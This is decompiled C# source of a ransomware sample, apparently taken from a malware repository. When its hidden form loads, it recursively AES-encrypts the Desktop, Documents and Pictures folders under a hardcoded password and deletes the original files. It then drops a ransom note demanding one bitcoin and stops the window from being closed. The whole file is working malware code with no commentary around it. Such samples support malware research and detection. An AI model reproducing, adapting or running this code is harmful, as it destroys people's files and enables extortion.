// Decompiled with JetBrains decompiler
// Type: covid.Form1
// Assembly: covid, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DFEF3BB4-5E4F-463E-8861-A9CB5CB19213
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Gen.gen-372fa440571b4ab1db28d8736c9014e11d8e27277c094062f2c444b6b97e8182.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace covid
{
  public class Form1 : Form
  {
    private const bool DELETE_ALL_ORIGINALS = true;
    private const bool ENCRYPT_DESKTOP = true;
    private const bool ENCRYPT_DOCUMENTS = true;
    private const bool ENCRYPT_PICTURES = true;
    private const string ENCRYPTED_FILE_EXTENSION = ".ncovid";
    private const string ENCRYPT_PASSWORD = "4758475648657834585706";
    private const string BITCOIN_ADDRESS = "4HD74J5gd6G6f6jj49786";
    private const string BITCOIN_RANSOM_AMOUNT = "1";
    private const string EMAIL_ADDRESS = "Ciastko.zlukrem@gmail.com";
    private static string ENCRYPTION_LOG = "";
    private string RANSOM_LETTER = "All of your files have been encrypted.\n\nTo unlock them, please send 1 bitcoin(s) to BTC address: 4HD74J5gd6G6f6jj49786\nAfterwards, please email your transaction ID to: Ciastko.zlukrem@gmail.com\n\nThank you and have a nice day!\n\nEncryption Log:\n----------------------------------------\n";
    private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
    private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
    private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
    private static int encryptedFileCount = 0;
    private IContainer components = (IContainer) null;
    private Label lblCount;
    private Label lblBitcoinAmount;
    private Label txtBitcoinAddress;
    private Label txtEmailAddress;

    public Form1() => this.InitializeComponent();

    private void Form1_Load(object sender, EventArgs e)
    {
      this.initializeForm();
      Form1.encryptFolderContents(this.DESKTOP_FOLDER);
      Form1.encryptFolderContents(this.PICTURES_FOLDER);
      Form1.encryptFolderContents(this.DOCUMENTS_FOLDER);
      if (Form1.encryptedFileCount > 0)
      {
        this.formatFormPostEncryption();
        this.dropRansomLetter();
      }
      else
      {
        Console.Out.WriteLine("No files to encrypt.");
        Application.Exit();
      }
    }

    private void dropRansomLetter()
    {
      StreamWriter streamWriter = new StreamWriter(this.DESKTOP_FOLDER + "\\___RECOVER__FILES__.ncovid.txt");
      streamWriter.WriteLine(this.RANSOM_LETTER);
      streamWriter.WriteLine(Form1.ENCRYPTION_LOG);
      streamWriter.Close();
    }

    private void formatFormPostEncryption()
    {
      this.Opacity = 100.0;
      this.lblCount.Text = "Your files (count: " + Form1.encryptedFileCount.ToString() + ") have been encrypted!";
    }

    private void initializeForm()
    {
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.lblBitcoinAmount.Text = "Please send 1 Bitcoin(s) to the following BTC address:";
      this.txtBitcoinAddress.Text = "4HD74J5gd6G6f6jj49786";
      this.txtEmailAddress.Text = "Ciastko.zlukrem@gmail.com";
      this.lblBitcoinAmount.Focus();
    }

    private static void encryptFolderContents(string sDir)
    {
      try
      {
        foreach (string file in Directory.GetFiles(sDir))
        {
          if (!file.Contains(".ncovid"))
          {
            Console.Out.WriteLine("Encrypting: " + file);
            Form1.FileEncrypt(file, "4758475648657834585706");
          }
        }
        foreach (string directory in Directory.GetDirectories(sDir))
          Form1.encryptFolderContents(directory);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }

    private static void FileEncrypt(string inputFile, string password)
    {
      byte[] randomSalt = Form1.GenerateRandomSalt();
      FileStream fileStream1 = new FileStream(inputFile + ".ncovid", FileMode.Create);
      byte[] bytes = Encoding.UTF8.GetBytes(password);
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.KeySize = 256;
      rijndaelManaged.BlockSize = 128;
      rijndaelManaged.Padding = PaddingMode.PKCS7;
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, randomSalt, 50000);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
      rijndaelManaged.Mode = CipherMode.CBC;
      fileStream1.Write(randomSalt, 0, randomSalt.Length);
      CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
      FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
      byte[] buffer = new byte[1048576];
      try
      {
        int count;
        while ((count = fileStream2.Read(buffer, 0, buffer.Length)) > 0)
          cryptoStream.Write(buffer, 0, count);
        fileStream2.Close();
      }
      catch (Exception ex)
      {
        Console.WriteLine("Error: " + ex.Message);
      }
      finally
      {
        Form1.ENCRYPTION_LOG = Form1.ENCRYPTION_LOG + inputFile + "\n";
        ++Form1.encryptedFileCount;
        cryptoStream.Close();
        fileStream1.Close();
        File.Delete(inputFile);
      }
    }

    private static void FileDecrypt(string inputFile, string outputFile, string password)
    {
      byte[] bytes = Encoding.UTF8.GetBytes(password);
      byte[] numArray = new byte[32];
      FileStream fileStream1 = new FileStream(inputFile, FileMode.Open);
      fileStream1.Read(numArray, 0, numArray.Length);
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.KeySize = 256;
      rijndaelManaged.BlockSize = 128;
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, numArray, 50000);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
      rijndaelManaged.Padding = PaddingMode.PKCS7;
      rijndaelManaged.Mode = CipherMode.CBC;
      CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
      FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
      byte[] buffer = new byte[1048576];
      try
      {
        int count;
        while ((count = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
          fileStream2.Write(buffer, 0, count);
      }
      catch (CryptographicException ex)
      {
        Console.WriteLine("CryptographicException error: " + ex.Message);
      }
      catch (Exception ex)
      {
        Console.WriteLine("Error: " + ex.Message);
      }
      try
      {
        cryptoStream.Close();
      }
      catch (Exception ex)
      {
        Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
      }
      finally
      {
        fileStream2.Close();
        fileStream1.Close();
      }
    }

    public static byte[] GenerateRandomSalt()
    {
      byte[] data = new byte[32];
      using (RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider())
      {
        for (int index = 0; index < 10; ++index)
          cryptoServiceProvider.GetBytes(data);
      }
      return data;
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e) => e.Cancel = true;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.lblCount = new Label();
      this.lblBitcoinAmount = new Label();
      this.txtBitcoinAddress = new Label();
      this.txtEmailAddress = new Label();
      this.SuspendLayout();
      this.lblCount.AutoSize = true;
      this.lblCount.Location = new Point(13, 13);
      this.lblCount.Name = "lblCount";
      this.lblCount.Size = new Size(35, 13);
      this.lblCount.TabIndex = 0;
      this.lblCount.Text = "label1";
      this.lblBitcoinAmount.AutoSize = true;
      this.lblBitcoinAmount.Location = new Point(113, 247);
      this.lblBitcoinAmount.Name = "lblBitcoinAmount";
      this.lblBitcoinAmount.Size = new Size(35, 13);
      this.lblBitcoinAmount.TabIndex = 1;
      this.lblBitcoinAmount.Text = "label1";
      this.txtBitcoinAddress.AutoSize = true;
      this.txtBitcoinAddress.Location = new Point(563, 413);
      this.txtBitcoinAddress.Name = "txtBitcoinAddress";
      this.txtBitcoinAddress.Size = new Size(35, 13);
      this.txtBitcoinAddress.TabIndex = 2;
      this.txtBitcoinAddress.Text = "label1";
      this.txtEmailAddress.AutoSize = true;
      this.txtEmailAddress.Location = new Point(342, 684);
      this.txtEmailAddress.Name = "txtEmailAddress";
      this.txtEmailAddress.Size = new Size(35, 13);
      this.txtEmailAddress.TabIndex = 3;
      this.txtEmailAddress.Text = "label1";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(1302, 808);
      this.Controls.Add((Control) this.txtEmailAddress);
      this.Controls.Add((Control) this.txtBitcoinAddress);
      this.Controls.Add((Control) this.lblBitcoinAmount);
      this.Controls.Add((Control) this.lblCount);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = nameof (Form1);
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
